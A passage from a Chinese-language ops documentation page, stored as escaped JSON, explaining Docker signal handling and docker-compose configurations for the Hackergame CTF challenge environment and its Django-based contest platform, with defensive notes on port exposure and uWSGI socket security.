--name=python-signal python bash\nroot@ecdc8fe55f36:/# exec python -c \"import time; time.sleep(10000000)\"  # \u200b\u4f7f\u7528\u200b `exec` \u200b\u786e\u4fdd\u200b PID 1 \u200b\u4ece\u200b bash \u200b\u53d8\u6210\u200b python\n\n$ # \u200b\u53e6\u200b\u4e00\u4e2a\u200b\u7ec8\u7aef\u200b\n$ sudo docker stop python-signal\n\uff08\u200b\u5361\u4f4f\u200b\u76f4\u5230\u200b\u8d85\u65f6\u200b\uff0cSIGKILL\uff09\n</code></pre> <p>\u200b\u5982\u679c\u200b\u5728\u200b\u6253\u5305\u200b Python \u200b\u5e94\u7528\u200b\u65f6\u200b\u6ca1\u6709\u200b\u6ce8\u610f\u200b\u7684\u8bdd\u200b\uff0c\u200b\u90a3\u4e48\u200b\u5173\u95ed\u200b\u5bb9\u5668\u200b\u7684\u200b\u4f53\u9a8c\u200b\u5c31\u200b\u4f1a\u200b\u975e\u5e38\u200b\u7cdf\u7cd5\u200b\uff0c\u200b\u5e76\u4e14\u200b\u5f3a\u5236\u200b\u9000\u51fa\u200b\u4e5f\u200b\u5e26\u6765\u200b\u4e86\u200b\u6f5c\u5728\u200b\u7684\u200b\u6570\u636e\u200b\u4e22\u5931\u200b\u7684\u200b\u98ce\u9669\u200b\u3002\u200b\u5982\u679c\u200b\u4e0d\u200b\u5e0c\u671b\u200b\u542f\u52a8\u200b\u5bb9\u5668\u200b\u989d\u5916\u200b\u8bbe\u7f6e\u200b <code>--init</code>\uff0c\u200b\u6216\u8005\u200b\u9700\u8981\u200b\u5728\u200b\u9000\u51fa\u200b\u65f6\u200b\u505a\u200b\u989d\u5916\u200b\u6e05\u7406\u200b\u7b49\u200b\u64cd\u4f5c\u200b\u7684\u8bdd\u200b\uff0c\u200b\u5bf9\u4e8e\u200b Python \u200b\u800c\u8a00\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u8fd9\u4e48\u200b\u89e3\u51b3\u200b\uff1a</p> <pre><code>import signal\nimport sys\n\ndef handler(signum, frame):\n  sys.exit(0)  # \u200b\u6216\u8005\u200b\u7ed9\u200b\u5168\u5c40\u53d8\u91cf\u200b\u8d4b\u503c\u200b\uff0c\u200b\u7136\u540e\u200b\u5728\u200b\u4e3b\u7a0b\u5e8f\u200b\u4e2d\u200b\u68c0\u67e5\u200b\u5bf9\u5e94\u200b\u7684\u200b\u503c\u6765\u200b\u5b9e\u73b0\u200b\u300c\u200b\u4f18\u96c5\u200b\u9000\u51fa\u200b\u300d\n\nsignal.signal(signal.SIGTERM, handler)\n# ...\n</code></pre> <p>\u200b\u7528\u6237\u200b\u9700\u8981\u200b\u8fd0\u884c\u200b\u7684\u200b\u9898\u76ee\u200b\u7684\u200b\u793a\u4f8b\u200b\u5219\u200b\u5728\u200b <code>example</code> \u200b\u76ee\u5f55\u200b\u4e0b\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u770b\u200b\u4e00\u4e0b\u200b\u8fd9\u91cc\u200b\u7684\u200b <code>docker-compose.yml</code> \u200b\u6587\u4ef6\u200b\uff1a</p> <pre><code>version: '2.4'\nservices:\n  challenge:\n    build: .\n    entrypoint: [\"/bin/true\"]\n  front:\n    extends:\n      file: ../dynamic_flag/docker-compose.yml\n      service: front\n    depends_on:\n      - challenge\n  web:\n    extends:\n      file: ../web_netcat/docker-compose.yml\n      service: web\n</code></pre> <p>\u200b\u5176\u4e2d\u200b <code>challenge</code> \u200b\u670d\u52a1\u200b\u4ee3\u8868\u200b\u9898\u76ee\u200b\u672c\u8eab\u200b\uff0c\u200b\u8fd9\u91cc\u200b\u4fee\u6539\u200b <code>entrypoint</code>\uff0c\u200b\u8ba9\u200b\u8fd0\u884c\u200b\u65f6\u200b\u884c\u4e3a\u200b\u53d8\u6210\u200b\u76f4\u63a5\u200b\u9000\u51fa\u200b\uff0c\u200b\u53ea\u662f\u200b\u4e3a\u4e86\u200b\u80fd\u200b\u8ba9\u200b compose \u200b\u521b\u5efa\u200b\u51fa\u200b\u5bf9\u5e94\u200b\u7684\u200b\u5bb9\u5668\u200b\u955c\u50cf\u200b\uff08\u200b\u9009\u624b\u200b\u5728\u200b\u8fde\u63a5\u200b\u65f6\u200b\u7531\u200b\u62e5\u6709\u200b Docker socket \u200b\u7684\u200b <code>front</code> \u200b\u64cd\u4f5c\u200b\u4e3a\u200b\u6bcf\u4e2a\u200b\u9009\u624b\u200b\u521b\u5efa\u200b\u3001\u200b\u8fd0\u884c\u200b\u5bb9\u5668\u200b\uff09\u3002<code>front</code> \u200b\u4e0e\u200b <code>web</code> \u200b\u4f7f\u7528\u200b\u4e86\u200b <code>extends</code> \u200b\u6307\u4ee4\u200b\u6765\u200b\u7ee7\u627f\u200b\u5bf9\u5e94\u200b\u7684\u200b compose \u200b\u914d\u7f6e\u200b\u3002\u200b\u53e6\u5916\u200b\uff0c<code>depends_on</code> \u200b\u6307\u4ee4\u200b\u8868\u793a\u200b <code>front</code> \u200b\u670d\u52a1\u200b\u4f9d\u8d56\u4e8e\u200b <code>challenge</code> \u200b\u670d\u52a1\u200b\uff0c\u200b\u5373\u200b <code>challenge</code> \u200b\u670d\u52a1\u200b\u542f\u52a8\u200b\u540e\u200b <code>front</code> \u200b\u670d\u52a1\u200b\u624d\u200b\u4f1a\u200b\u542f\u52a8\u200b\u3002</p> <p>\u200b\u5728\u200b <code>extends</code> \u200b\u4e4b\u540e\u200b interpolation \u200b\u4f1a\u200b\u4f18\u5148\u200b\u4f7f\u7528\u200b\u5f53\u524d\u76ee\u5f55\u200b\u7684\u200b <code>.env</code> \u200b\u6587\u4ef6\u200b\uff0c\u200b\u56e0\u6b64\u200b <code>example/.env</code> \u200b\u6587\u4ef6\u200b\u4e2d\u200b\u53ef\u4ee5\u200b\u8986\u76d6\u200b\u6389\u200b\u4e0a\u8ff0\u200b\u4e24\u4e2a\u200b\u76ee\u5f55\u200b\u4e0b\u200b <code>.env</code> \u200b\u7684\u200b\u914d\u7f6e\u200b\u3002</p> <p>\u200b\u6700\u7ec8\u200b\u751f\u6210\u200b\u7684\u200b\u914d\u7f6e\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>docker compose config</code> \u200b\u67e5\u770b\u200b\u3002</p> Example \u200b\u6700\u540e\u200b\u7684\u200b\u5b9e\u9645\u200b\u914d\u7f6e\u200b <pre><code>$ docker compose config\nWARN[0000] /example/hackergame-challenge-docker/example/docker-compose.yml: `version` is obsolete\nname: example\nservices:\n  challenge:\n    build:\n      context: /example/hackergame-challenge-docker/example\n      dockerfile: Dockerfile\n    entrypoint:\n      - /bin/true\n    networks:\n      default: null\n  front:\n    build:\n      context: /example/hackergame-challenge-docker/dynamic_flag\n      dockerfile: Dockerfile\n    depends_on:\n      challenge:\n        condition: service_started\n        required: true\n    environment:\n      TZ: Asia/Shanghai\n      hackergame_challenge_docker_name: example_challenge\n      hackergame_challenge_network: \"\"\n      hackergame_challenge_timeout: \"300\"\n      hackergame_conn_interval: \"10\"\n      hackergame_flag_path: /flag1,/flag2\n      hackergame_flag_rule: f\"flag{{this_is_an_example_{sha256('example1'+token)[:10]}}}\",f\"flag{{this_is_the_second_flag_{sha256('example2'+token)[:10]}}}\"\n      hackergame_flag_suid: \"\"\n      hackergame_mem_limit: 256m\n      hackergame_pids_limit: \"16\"\n      hackergame_read_only: \"1\"\n      hackergame_shm_exec: \"0\"\n      hackergame_token_timeout: \"30\"\n    ipc: shareable\n    networks:\n      default: null\n    ports:\n      - mode: ingress\n        target: 2333\n        published: \"10000\"\n        protocol: tcp\n    read_only: true\n    restart: always\n    ulimits:\n      nofile:\n        soft: 65536\n        hard: 65536\n    volumes:\n      - type: bind\n        source: /var/run/docker.sock\n        target: /var/run/docker.sock\n        bind:\n          create_host_path: true\n  web:\n    build:\n      context: /example/hackergame-challenge-docker/web_netcat\n      dockerfile: Dockerfile\n    environment:\n      nc_host: front\n      nc_port: \"2333\"\n      nc_raw: \"0\"\n    init: true\n    networks:\n      default: null\n    ports:\n      - mode: ingress\n        target: 3000\n        published: \"10001\"\n        protocol: tcp\n    restart: always\nnetworks:\n  default:\n    name: example_default\n</code></pre>"},{"location":"ops/virtualization/container/#compose-hackergame-platform","title":"\u6848\u4f8b\u200b 2\uff1aHackergame \u200b\u6bd4\u8d5b\u200b\u5e73\u53f0\u200b\u7684\u200b Docker compose \u200b\u6d4b\u8bd5\u200b\u65b9\u6848","text":"<p>\uff08\u200b\u4ee5\u4e0b\u5185\u5bb9\u200b\u57fa\u4e8e\u200b https://github.com/ustclug/hackergame/pull/175/files\uff09</p> <p>Hackergame \u200b\u6bd4\u8d5b\u200b\u5e73\u53f0\u200b\u53ef\u4ee5\u200b\u7b97\u662f\u200b\u4e00\u4e2a\u200b\u6bd4\u8f83\u590d\u6742\u200b\u7684\u200b Web \u200b\u5e94\u7528\u200b\u4e86\u200b\uff1a</p> <ul> <li>\u200b\u5e73\u53f0\u200b\u4f7f\u7528\u200b Django \u200b\u6846\u67b6\u200b\uff0c\u200b\u5728\u200b\u751f\u4ea7\u200b\u73af\u5883\u200b\u4e2d\u200b\uff0c\u200b\u9700\u8981\u200b\u4f7f\u7528\u200b uWSGI \u200b\u4f5c\u4e3a\u200b WSGI \u200b\u670d\u52a1\u5668\u200b\u3002</li> <li>\u200b\u5e73\u53f0\u200b\u9700\u8981\u200b\u4f7f\u7528\u200b PostgreSQL \u200b\u4f5c\u4e3a\u200b\u6570\u636e\u5e93\u200b\u3002<ul> <li>\u200b\u7531\u4e8e\u200b uWSGI \u200b\u4f7f\u7528\u200b\u4e86\u200b gevent\uff0c\u200b\u56e0\u6b64\u200b Django \u200b\u81ea\u5e26\u200b\u7684\u200b\u6570\u636e\u5e93\u200b\u8fde\u63a5\u6c60\u200b\u65e0\u6cd5\u200b\u6b63\u5e38\u200b\u5de5\u4f5c\u200b\uff0c\u200b\u9700\u8981\u200b\u4f7f\u7528\u200b pgBouncer \u200b\u5728\u200b Django \u200b\u4e0e\u200b PostgreSQL \u200b\u4e4b\u95f4\u200b\u5efa\u7acb\u200b\u8fde\u63a5\u6c60\u200b\u3002</li> </ul> </li> <li>\u200b\u5e73\u53f0\u200b\u4f7f\u7528\u200b Memcached \u200b\u4f5c\u4e3a\u200b\u5185\u5b58\u200b\u7f13\u5b58\u200b\u6570\u636e\u5e93\u200b\u3002</li> <li>\u200b\u5728\u200b uWSGI \u200b\u5916\u662f\u200b Nginx \u200b\u4f5c\u4e3a\u200b\u53cd\u5411\u200b\u4ee3\u7406\u200b\uff0c\u200b\u4e3a\u200b\u7528\u6237\u200b\u66b4\u9732\u200b\u670d\u52a1\u200b\u3002</li> </ul> <p>\u200b\u5bf9\u4e8e\u200b\u8fd9\u91cc\u200b\u7684\u200b <code>docker-compose.yml</code>\uff0c\u200b\u9996\u5148\u200b\u770b\u200b <code>services</code> \u200b\u5185\u90e8\u200b\u4e0e\u200b\u6570\u636e\u5e93\u200b\u6709\u5173\u200b\u7684\u200b\u4e09\u4e2a\u200b\u670d\u52a1\u200b\uff1a</p> <pre><code>memcached:\n  container_name: hackergame-memcached\n  image: memcached\n  restart: always\npostgresql:\n  container_name: hackergame-postgresql\n  image: postgres:15\n  restart: always\n  environment:\n    - POSTGRES_USER=hackergame\n    - POSTGRES_PASSWORD=${DB_PASSWORD}\n    - POSTGRES_DB=hackergame\n  volumes:\n    - hackergame-postgresql:/var/lib/postgresql/data/\npgbouncer:\n  container_name: hackergame-pgbouncer\n  image: edoburu/pgbouncer:latest\n  restart: always\n  environment:\n    - DB_USER=hackergame\n    - DB_PASSWORD=${DB_PASSWORD}\n    - DB_HOST=postgresql\n    - POOL_MODE=transaction\n    # \u200b\u5751\u200b: pg14+ \u200b\u9ed8\u8ba4\u200b\u4f7f\u7528\u200b scram-sha-256, \u200b\u800c\u200b pgbouncer \u200b\u9ed8\u8ba4\u200b\u662f\u200b md5\n    - AUTH_TYPE=scram-sha-256\n  depends_on:\n    - postgresql\n</code></pre> <p>\u200b\u9664\u53bb\u200b\u6848\u4f8b\u200b 1 \u200b\u4e2d\u200b\u5df2\u7ecf\u200b\u4ecb\u7ecd\u200b\u7684\u200b\u914d\u7f6e\u200b\uff0c\u200b\u8fd9\u91cc\u200b\u8bbe\u7f6e\u200b\u4e86\u200b\u5bb9\u5668\u200b\u540d\u79f0\u200b\u4e0e\u200b volume\u3002\u200b\u5bf9\u4e8e\u200b\u6570\u636e\u5e93\u200b\u800c\u8a00\u200b\uff0c\u200b\u6dfb\u52a0\u200b volume \u200b\u8fdb\u884c\u200b\u6301\u4e45\u200b\u5316\u662f\u200b\u6709\u200b\u5fc5\u8981\u200b\u7684\u200b\uff0c\u200b\u5426\u5219\u200b\u5bb9\u5668\u200b\u91cd\u542f\u200b\u540e\u200b\u6570\u636e\u200b\u5c31\u200b\u4f1a\u200b\u4e22\u5931\u200b\u3002\u200b\u5982\u679c\u200b\u5b9a\u4e49\u200b\u4e86\u200b volume\uff0c\u200b\u8fd8\u200b\u9700\u8981\u200b\u5728\u200b\u6700\u200b\u5916\u5c42\u200b\u7684\u200b <code>volumes</code> \u200b\u4e2d\u200b\u5b9a\u4e49\u200b\u8fd9\u4e2a\u200b volume\u3002\u200b\u8be5\u200b compose \u200b\u6587\u4ef6\u200b\u5b9a\u4e49\u200b\u4e86\u200b\u4e09\u4e2a\u200b\u4f7f\u7528\u200b\u7684\u200b volume\uff1a</p> <pre><code>volumes:\n  hackergame-static:\n  nginx-log:\n  hackergame-postgresql:\n</code></pre> <p><code>docker compose down</code> \u200b\u4e0e\u200b volume</p> <p>\u200b\u9ed8\u8ba4\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff0c<code>docker compose down</code> \u200b\u4e0d\u4f1a\u200b\u5220\u9664\u200b volume\u3002\u200b\u5982\u679c\u200b\u9700\u8981\u200b\u5220\u9664\u200b volume\uff0c\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>docker compose down -v</code>\u3002</p> <p>\u200b\u800c\u200b\u8fd9\u91cc\u200b\u989d\u5916\u200b\u8bbe\u7f6e\u200b <code>container_name</code>\uff08\u200b\u5bb9\u5668\u200b\u540d\u200b\uff09\u200b\u7684\u200b\u76ee\u7684\u200b\u662f\u200b\uff0c\u200b\u5728\u200b\u8fd9\u4e9b\u200b\u5bb9\u5668\u200b\u7ec4\u6210\u200b\u7684\u200b\u5185\u200b\u7f51\u4e2d\u200b\uff0cDocker \u200b\u63d0\u4f9b\u200b\u7684\u200b DNS \u200b\u5c31\u200b\u5141\u8bb8\u200b\u4f7f\u7528\u200b\u66f4\u200b\u77ed\u200b\u7684\u200b\u4e3b\u673a\u540d\u200b\uff08\u200b\u670d\u52a1\u200b\u540d\u200b\uff09\u200b\u505a\u200b\u670d\u52a1\u200b\uff08\u200b\u5bb9\u5668\u200b\uff09\u200b\u4e4b\u95f4\u200b\u7684\u200b\u4e92\u76f8\u200b\u901a\u4fe1\u200b\uff0c\u200b\u800c\u200b\u7528\u6237\u200b\u7ba1\u7406\u200b\u5bb9\u5668\u200b\u65f6\u200b\u56e0\u4e3a\u200b\u5bb9\u5668\u200b\u540d\u200b\u90fd\u200b\u4ee5\u200b <code>hackergame-</code> \u200b\u5f00\u5934\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u65b9\u4fbf\u200b\u5730\u533a\u200b\u5206\u200b\u5e73\u53f0\u200b\u5bb9\u5668\u200b\u4e0e\u200b\u5176\u4ed6\u200b\u7684\u200b\u5bb9\u5668\u200b\u3002</p> <code>resolv.conf</code> \u200b\u914d\u7f6e\u200b\uff0c\u200b\u4e0e\u200b <code>ping</code> \u200b\u4e3b\u673a\u540d\u200b\u4e0e\u200b\u5bb9\u5668\u200b\u540d\u200b\u7684\u200b\u8f93\u51fa\u200b <pre><code>root@hackergame:/# cat /etc/resolv.conf\n# Generated by Docker Engine.\n# This file can be edited; Docker Engine will not make further changes once it\n# has been modified.\n\nnameserver 127.0.0.11\nsearch example.com\noptions ndots:0\n\n# Based on host file: '/etc/resolv.conf' (internal resolver)\n# ExtServers: [192.168.0.1]\n# Overrides: []\n# Option ndots from: internal\nroot@hackergame:/# ping nginx\nPING nginx (172.17.1.118) 56(84) bytes of data.\n64 bytes from hackergame-nginx.hackergame_default (172.17.1.118): icmp_seq=1 ttl=64 time=0.184 ms\n^C\nroot@hackergame:/# ping hackergame-nginx\nPING hackergame-nginx (172.17.1.118) 56(84) bytes of data.\n64 bytes from hackergame-nginx.hackergame_default (172.17.1.118): icmp_seq=1 ttl=64 time=0.233 ms\n^C\n</code></pre> <p>\u200b\u6620\u5c04\u200b\u7aef\u53e3\u200b\u7684\u200b\u5b89\u5168\u6027\u200b\uff08Compose\uff09</p> <p>\u200b\u5982\u679c\u200b\u9605\u8bfb\u200b\u7f51\u7edc\u200b\u4e0a\u200b\u67d0\u4e9b\u200b Docker compose \u200b\u7684\u200b\u914d\u7f6e\u200b\uff0c\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u53d1\u73b0\u200b\u4ed6\u4eec\u200b\u4f1a\u200b\u50cf\u200b\u8fd9\u6837\u200b\u5c06\u200b\u6570\u636e\u5e93\u200b\u7684\u200b\u7aef\u53e3\u200b\u8fdb\u884c\u200b\u6620\u5c04\u200b\uff1a</p> <pre><code>postgresql:\n  image: postgres:15\n  ports:\n    - \"5432:5432\"\n</code></pre> <p>\u200b\u9664\u975e\u200b\u6709\u200b\u786e\u5207\u200b\u7684\u200b\u9700\u6c42\u200b\u9700\u8981\u200b\u6570\u636e\u5e93\u200b\u4ece\u200b\u8be5\u200b compose \u200b\u6587\u4ef6\u200b\u7ba1\u7406\u200b\u7684\u200b\u5bb9\u5668\u200b\u4e4b\u5916\u200b\u7684\u200b\u5730\u65b9\u200b\u8bbf\u95ee\u200b\uff0c\u200b\u5426\u5219\u200b\u4e0d\u200b\u5e94\u8be5\u200b\u8fd9\u4e48\u200b\u8bbe\u7f6e\u200b\uff0c\u200b\u7406\u7531\u200b\u548c\u200b\u57fa\u7840\u200b\u6982\u5ff5\u200b\u90e8\u5206\u200b\u4e2d\u200b\u63d0\u5230\u200b\u7684\u200b\u4e00\u6837\u200b\u3002</p> <p>\u200b\u7531\u4e8e\u200b compose \u200b\u4f1a\u4e3a\u200b\u5176\u200b\u7ba1\u7406\u200b\u7684\u200b\u670d\u52a1\u200b\u521b\u5efa\u200b\u4e13\u95e8\u200b\u7684\u200b bridge \u200b\u7f51\u7edc\u200b\uff0c\u200b\u800c\u200b bridge \u200b\u7f51\u7edc\u200b\u5185\u90e8\u200b\u7684\u200b\u5bb9\u5668\u200b\u53ef\u4ee5\u200b\u4e92\u76f8\u200b\u76f4\u63a5\u200b\u4f7f\u7528\u200b\u4e3b\u673a\u540d\u200b\u901a\u4fe1\u200b\uff0c\u200b\u56e0\u6b64\u200b\u4e0d\u200b\u9700\u8981\u200b\u50cf\u200b\u8fd9\u4e48\u200b\u66b4\u9732\u200b\u7aef\u53e3\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u6b63\u5e38\u200b\u5de5\u4f5c\u200b\u3002</p> <p>Django \u200b\u90e8\u5206\u200b\u7684\u200b\u914d\u7f6e\u200b\u5982\u4e0b\u200b\uff1a</p> <pre><code>hackergame:\n  container_name: &amp;name hackergame\n  hostname: *name\n  build: .\n  restart: always\n  environment:\n    - DJANGO_SETTINGS_MODULE=conf.settings.docker\n    - DB_PASSWORD=${DB_PASSWORD}\n    # \u200b\u8c03\u8bd5\u200b\u7528\u200b\n    - DEBUG=True\n  volumes:\n    - .:/opt/hackergame/:ro\n    # \u200b\u5b58\u50a8\u200b\u9759\u6001\u200b\u7f51\u9875\u200b\u4e0e\u200b\u9898\u76ee\u200b\u6587\u4ef6\u200b\n    - hackergame-static:/var/opt/hackergame/\n    # \u200b\u5f88\u200b\u4e0d\u5e78\u200b\uff0c\u200b\u4f60\u200b\u53ef\u80fd\u200b\u8fd8\u200b\u9700\u8981\u200b bind \u200b\u5b8c\u6574\u200b\u7684\u200b\u9898\u76ee\u200b\u76ee\u5f55\u200b\u8fdb\u6765\u200b\uff08\u200b\u4e0d\u7136\u200b\u4e0d\u200b\u65b9\u4fbf\u200b\u5bfc\u5165\u200b\uff09\n  depends_on:\n    - memcached\n    - pgbouncer\n</code></pre> <p>\u200b\u8fd9\u91cc\u200b\u7684\u200b <code>&amp;name</code> \u200b\u548c\u200b <code>*name</code> \u200b\u5229\u7528\u200b\u4e86\u200b YAML \u200b\u7684\u200b Anchor \u200b\u4e0e\u200b Alias \u200b\u529f\u80fd\u200b\u3002\u200b\u8fd9\u91cc\u200b <code>&amp;name hackergame</code> \u200b\u5b9a\u4e49\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u540d\u4e3a\u200b <code>name</code>\uff0c\u200b\u503c\u4e3a\u200b <code>hackergame</code> \u200b\u7684\u200b Anchor\uff0c\u200b\u800c\u200b <code>*name</code> \u200b\u5219\u200b\u8868\u793a\u200b\u4f7f\u7528\u200b <code>name</code> \u200b\u8fd9\u4e2a\u200b Anchor \u200b\u7684\u200b\u503c\u200b\u3002</p> <p>\u200b\u5728\u200b\u8fd9\u4e2a\u200b\u4f8b\u5b50\u200b\u4e2d\u200b\uff0c\u200b\u4f7f\u7528\u200b\u8fd9\u4e2a\u200b\u7279\u6027\u200b\u6216\u8bb8\u200b\u6709\u4e9b\u200b\u5c0f\u9898\u5927\u505a\u200b\uff0c\u200b\u4f46\u662f\u200b\u5728\u200b\u4e00\u4e9b\u200b\u590d\u6742\u200b\u7684\u200b\u914d\u7f6e\u200b\u4e2d\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b Anchor \u200b\u5b9a\u4e49\u200b\u4e00\u7cfb\u5217\u200b\u6620\u5c04\u200b\uff0c\u200b\u7c7b\u4f3c\u200b\u8fd9\u6837\u200b\uff1a</p> <pre><code>environment: &amp;env\n  - EXAMPLE=1\n  - PYTHON_UNBUFFERED=1\n  - TZ=Asia/Shanghai\n  # ...\n</code></pre> <p>\u200b\u7136\u540e\u200b\u5728\u200b\u5176\u4ed6\u200b\u5730\u65b9\u200b\u4f7f\u7528\u200b <code>*env</code> \u200b\u5f15\u7528\u200b\u8fd9\u4e2a\u200b\u6620\u5c04\u200b\uff1a</p> <pre><code>environment: *env\n\n# \u200b\u6216\u8005\u200b\uff0c\u200b\u5982\u679c\u200b\u9700\u8981\u200b\u518d\u200b\u6dfb\u52a0\u200b\u5176\u4ed6\u200b\u7684\u200b\u503c\u200b\nenvironment:\n  &lt;&lt;: *env\n  - OTHER_ENV=2\n</code></pre> <p>\u200b\u6b64\u5916\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u53d1\u73b0\u200b\u5728\u200b <code>volumes</code> \u200b\u7684\u200b\u5b9a\u4e49\u200b\u4e2d\u200b\uff0c\u200b\u4e0d\u518d\u200b\u9700\u8981\u200b\u4f7f\u7528\u200b <code>$(pwd)</code> \u200b\u5904\u7406\u200b\u76f8\u5bf9\u8def\u5f84\u200b\u7684\u200b\u95ee\u9898\u200b\uff1aDocker compose \u200b\u4f1a\u5e2e\u200b\u6211\u4eec\u200b\u641e\u5b9a\u200b\u76f8\u5bf9\u8def\u5f84\u200b\u5230\u200b\u7edd\u5bf9\u8def\u5f84\u200b\u7684\u200b\u8f6c\u6362\u200b\u3002</p> <p>Nginx \u200b\u7684\u200b compose \u200b\u914d\u7f6e\u200b\u6ca1\u6709\u200b\u65b0\u200b\u7684\u200b\u7279\u6027\u200b\uff0c\u200b\u56e0\u6b64\u200b\u4e0d\u518d\u200b\u8d58\u8ff0\u200b\u3002\u200b\u4e0d\u8fc7\u200b\uff0c\u200b\u53e6\u200b\u4e00\u70b9\u200b\u9700\u8981\u200b\u7279\u522b\u200b\u63d0\u53ca\u200b\u7684\u200b\u662f\u200b\uff0c\u200b\u5728\u200b\u4e0d\u200b\u4f7f\u7528\u200b Docker compose \u200b\u90e8\u7f72\u200b\u65f6\u200b\uff0c\u200b\u670d\u52a1\u200b\u4e4b\u95f4\u200b\u7684\u200b\u901a\u4fe1\u200b\u4f7f\u7528\u200b\u4e86\u200b UNIX socket\uff0c\u200b\u4f8b\u5982\u200b uwsgi \u200b\u66b4\u9732\u200b\u7684\u200b socket \u200b\u914d\u7f6e\u200b\u5982\u4e0b\u200b\uff1a</p> <pre><code>[uwsgi]\nsocket=unix:///run/uwsgi/app/hackergame/socket\n# ...\n</code></pre> <p>\u200b\u800c\u200b compose \u200b\u5b9e\u73b0\u200b\u66ff\u6362\u200b\u4e3a\u4e86\u200b TCP socket\uff1a</p> <pre><code>[uwsgi]\nsocket=:2018\n# ...\n</code></pre> <p>\u200b\u4e00\u4e2a\u200b\u91cd\u8981\u200b\u7684\u200b\u539f\u56e0\u200b\u662f\u200b\uff0cUNIX socket \u200b\u662f\u200b\u6709\u200b\u7528\u6237\u200b\u6240\u6709\u8005\u200b\u548c\u200b\u6743\u9650\u200b\u7684\u200b\uff0c\u200b\u4f46\u662f\u200b\u5728\u200b\u591a\u4e2a\u200b\u5bb9\u5668\u200b\u7684\u200b\u573a\u5408\u200b\u4e0b\u200b\uff0c\u200b\u4fdd\u8bc1\u200b\u6240\u6709\u200b\u5bb9\u5668\u200b\u7684\u200b <code>/etc/passwd</code> \u200b\u6620\u5c04\u200b\u7684\u200b\u7528\u6237\u200b\u4e00\u81f4\u200b\u662f\u200b\u6bd4\u8f83\u200b\u56f0\u96be\u200b\u7684\u200b\u3002\u200b\u800c\u200b TCP socket \u200b\u5219\u200b\u89e3\u51b3\u200b\u4e86\u200b\u8fd9\u4e2a\u200b\u95ee\u9898\u200b\u3002\u200b\u4f46\u662f\u200b\u5176\u200b\u5b89\u5168\u6027\u200b\u9700\u8981\u200b\u8003\u8651\u200b\uff0c\u200b\u4f8b\u5982\u200b uWSGI \u200b\u7684\u200b TCP socket \u200b\u9ed8\u8ba4\u200b\u662f\u200b\u6ca1\u6709\u200b\u989d\u5916\u200b\u7684\u200b\u9274\u6743\u200b\u7684\u200b\uff0c\u200b\u800c\u200b\u80fd\u591f\u200b\u8fde\u63a5\u200b\u5230\u200b\u8fd9\u4e2a\u200b socket \u200b\u7684\u200b\u8fdb\u7a0b\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u6267\u884c\u200b\u4efb\u610f\u200b\u547d\u4ee4\u200b\uff0c\u200b\u5728\u200b\u67d0\u4e9b\u200b\u4e0d\u200b\u6b63\u786e\u200b\u7684\u200b\u8bbe\u7f6e\u200b\u4e0b\u200b\uff0c\u200b\u5373\u4f7f\u200b\u5728\u200b\u914d\u7f6e\u200b\u4e2d\u5c06\u200b uWSGI \u200b\u964d\u6743\u200b\u8fd0\u884c\u200b\uff0c\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u4ee5\u6b64\u200b\u83b7\u53d6\u200b\u5230\u200b\u66f4\u200b\u9ad8\u200b\u7684\u200b\u6743\u9650\u200b\u3002\u200b\u5373\u4f7f\u200b uWSGI \u200b\u7684\u200b\u7aef\u53e3\u200b\u6ca1\u6709\u200b\u66b4\u9732\u200b\u5230\u200b\u5bb9\u5668\u200b\u5185\u200b\u7f51\u200b\u5916\u90e8\u200b\uff0c\u200b\u5982\u679c\u200b\u6709\u200b\u5176\u4ed6\u200b\u5bb9\u5668\u200b\u88ab\u200b\u653b\u7834\u200b\uff0c\u200b\u90a3\u4e48\u200b\u653b\u51fb\u8005\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u8f7b\u677e\u200b\u6a2a\u5411\u200b\u79fb\u52a8\u200b\u5230\u200b uWSGI \u200b\u6240\u5728\u200b\u5bb9\u5668\u200b\u3002</p> <p>Health check</p> <p>\u200b\u5728\u200b\u4e0a\u9762\u200b\u7684\u200b\u4f8b\u5b50\u200b\u4e2d\u200b\uff0c\u200b\u6211\u4eec\u200b\u9650\u5236\u200b\u4e86\u200b\u4e00\u4e9b\u200b\u5bb9\u5668\u200b\u5728\u200b\u5176\u4ed6\u200b\u5bb9\u5668\u200b\u542f\u52a8\u200b\u4e4b\u540e\u200b\u518d\u542f\u52a8\u200b\u3002\u200b\u4f46\u662f\u200b\u5728\u200b\u67d0\u4e9b\u200b\u573a\u666f\u200b\u4e0b\u200b\uff0c\u300c\u200b\u5bb9\u5668\u200b\u542f\u52a8\u200b\u300d\u200b\u5e76\u200b\u4e0d\u200b\u610f\u5473\u7740\u200b\u300c\u200b\u5bb9\u5668\u200b\u5df2\u7ecf\u200b\u51c6\u5907\u200b\u597d\u200b\u63a5\u53d7\u200b\u8bf7\u6c42\u200b\u300d\uff0c\u200b\u5728\u200b\u300c\u200b\u542f\u52a8\u200b\u300d\u200b\u548c\u200b\u300c\u200b\u51c6\u5907\u200b\u597d\u200b\u300d\u200b\u8fd9\u4e2a\u200b\u65f6\u95f4\u200b\u95f4\u9694\u200b\u4e2d\u200b\uff0c\u200b\u542f\u52a8\u200b\u9700\u8981\u200b\u5bf9\u5e94\u200b\u670d\u52a1\u200b\u7684\u200b\u5bb9\u5668\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u5931\u8d25\u200b\u3002</p> <p>Docker \u200b\u63d0\u4f9b\u200b\u4e86\u200b Health check \u200b\u529f\u80fd\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5b9a\u4e49\u200b\u5065\u5eb7\u68c0\u67e5\u200b\u7684\u200b\u547d\u4ee4\u200b\uff0c\u200b\u5728\u200b\u5bb9\u5668\u200b\u542f\u52a8\u200b\u540e\u200b\uff0cDocker 